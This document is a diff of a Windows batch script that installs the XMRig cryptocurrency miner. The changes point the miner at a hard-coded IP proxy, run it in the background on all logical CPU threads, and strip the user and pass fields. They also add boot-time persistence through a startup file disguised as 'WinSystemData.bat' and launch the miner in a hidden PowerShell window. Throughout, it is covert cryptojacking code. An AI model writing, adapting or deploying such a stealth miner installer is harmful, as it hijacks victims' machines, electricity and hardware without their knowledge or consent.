@@ -125,7 +125,7 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 "%MINER_DIR%\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
@@ -173,7 +173,7 @@ exit /b 1
 :MINER_OK
 
 
-set PASS=node
+rem PASS y WALLET no necesarios para proxy
 
 rem Deteccion inteligente de CPU con nucleos fisicos y logicos
 rem Intentar con wmic primero
@@ -208,8 +208,8 @@ echo %CPU_NAME% | findstr /i "AMD" >nul && set CPU_BRAND=AMD
 echo %CPU_NAME% | findstr /i "Ryzen" >nul && set CPU_BRAND=AMD_RYZEN
 echo %CPU_NAME% | findstr /i "Threadripper" >nul && set CPU_BRAND=AMD_THREADRIPPER
 
-rem Calcular threads disponibles (usar el menor entre fisicos y logicos para ser conservador)
-if %PHYSICAL_CORES% LSS %LOGICAL_CORES% (
+rem Calcular threads disponibles (usar threads logicos para aprovechar HT)
+if %LOGICAL_CORES% GTR %PHYSICAL_CORES% (
     set AVAILABLE_THREADS=%LOGICAL_CORES%
     set CORES_TYPE=HT
 ) else (
@@ -282,18 +282,15 @@ if %AVAILABLE_THREADS% LEQ 2 (
 )
 
 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"94.72.119.111:3333\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"priority\": *null,', '\"priority\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"huge-pages\": *true,', '\"huge-pages\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"colors\": *true,', '\"colors\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', ''} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"pass\": *\".*\",', ''} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"nicehash\": *false,', '\"nicehash\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
+
 copy /Y "%MINER_DIR%\config.json" "%MINER_DIR%\config_background.json" >NUL
-powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'"
-powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"colors\": *true,', '\"colors\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'"
-powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"priority\": *null,', '\"priority\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"huge-pages\": *true,', '\"huge-pages\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'" 
 
 (
 echo @echo off
@@ -321,7 +318,7 @@ exit /b 1
 :STARTUP_DIR_OK
 (
 echo @echo off
-echo start /min /b "%MINER_DIR%\miner.bat" --config="%MINER_DIR%\config_background.json"
+echo start /min /b "%MINER_DIR%\xmrig.exe" --config="%MINER_DIR%\config_background.json"
 ) > "%STARTUP_DIR%\WinSystemData.bat"
 
 powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\xmrig.exe' -ArgumentList '--config=%MINER_DIR%\config_background.json' -WindowStyle Hidden"
